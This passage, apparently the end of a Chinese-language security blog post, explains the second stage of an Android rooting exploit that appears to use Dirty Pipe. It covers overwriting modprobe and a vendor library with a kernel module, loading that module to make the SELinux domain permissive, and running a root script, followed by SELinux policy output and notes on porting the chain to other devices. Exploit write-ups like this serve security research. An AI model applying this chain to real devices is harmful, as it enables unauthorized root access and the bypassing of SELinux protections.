<li><p>32位的<code>libldacBT_enc.so</code>不应该频繁使用。</p>
</li>
</ul>
</li>
<li><p><code>libc++</code> 中的有效负载通过nmap加载用于 stage2 的有效负载<code>libldacBT_enc.so</code>。</p>
</li>
</ol>
</li>
<li><p>阶段2</p>
<ol>
<li>现在位于init进程中。</li>
<li>用 <code>modprobe-payload</code>覆盖<code>/vendor/bin/modprobe</code>。<ul>
<li>modprobe 有权加载内核模块。</li>
</ul>
</li>
<li>用内核模块 (mymod.ko) 的内容覆盖<code>/vendor/lib/libstagefright_soft_mp3dec.so</code>。<ul>
<li>modprobe 可以从 vendor_file 上下文加载内核模块。</li>
<li>之所以选择这个库，是因为它在 offset&#x3D;4096 处与 mymod.ko 具有相同的内容，并且无法被dirtypipe 覆盖。</li>
</ul>
</li>
<li>转换到<code>vendor_modprobe</code>上下文然后 <code>fork()/execve(/vendor/bin/modprobe)</code>。</li>
</ol>
</li>
<li><p>vendor_modprobe (modprobe-payload)</p>
<ol>
<li>打开（<code>/vendor/lib/libstagefright_soft_mp3dec.so</code>）<ul>
<li>文件内容被替换为 mymod.ko</li>
</ul>
</li>
<li>finit_module(mymod.ko)<ul>
<li>mymod.ko 将调用进程的 selinux 域设置为允许。</li>
</ul>
</li>
<li>运行<code>startup-root</code>脚本<ul>
<li>获取root。</li>
</ul>
</li>
</ol>
</li>
</ul>
<h4 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sesearch --allow policy-dump|grep module_load</span><br><span class="line">allow init-insmod-sh vendor_kernel_modules:system module_load;</span><br><span class="line">allow ueventd vendor_file:system module_load;</span><br><span class="line">allow vendor_modprobe vendor_file:system module_load;</span><br><span class="line"></span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:system_lib_file:s0     43168 2009-01-01 09:00 /system/lib/libldacBT_enc.so</span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:system_lib_file:s0     700392 2009-01-01 09:00 /system/lib64/libc++.so</span><br><span class="line">-rw-r--r-- 1 root root  u:object_r:vendor_file:s0         71068 2009-01-01 09:00 /vendor/lib/libstagefright_soft_mp3dec.so</span><br><span class="line">lrwxr-xr-x 1 root shell u:object_r:vendor_file:s0             7 2009-01-01 09:00 /vendor/bin/modprobe -&gt; toolbox</span><br></pre></td></tr></table></figure>

<ul>
<li><code>finit_module</code>可以加载<code>vendor_kernel_modules</code>或<code>vendor_file</code>。adb shell 或非系统应用程序都无法读取两者。所以内核模块必须由其他 selinux 上下文准备。<code>init</code>上下文可用于此（stage1 有效负载）。</li>
<li>init-insmod-sh 和 ueventd 也应该可用于此技术。（未实施&#x2F;测试）</li>
</ul>
<h4 id="添加对设备的支持"><a href="#添加对设备的支持" class="headerlink" title="添加对设备的支持"></a>添加对设备的支持</h4><ul>
<li>libc++.so 中的函数偏移量。</li>
<li>libc++.so 中的empty空间大小。</li>
<li><code>/vendor/bin/modprobe</code>可用性。</li>
<li><code>/vendor/lib/libstagefright_soft_mp3dec.so</code>可用性。<ul>
<li>必须与 mymod.ko 的内容匹配。</li>
</ul>
</li>
<li>为特定设备构建内核模块。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">buffer0verflooow</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
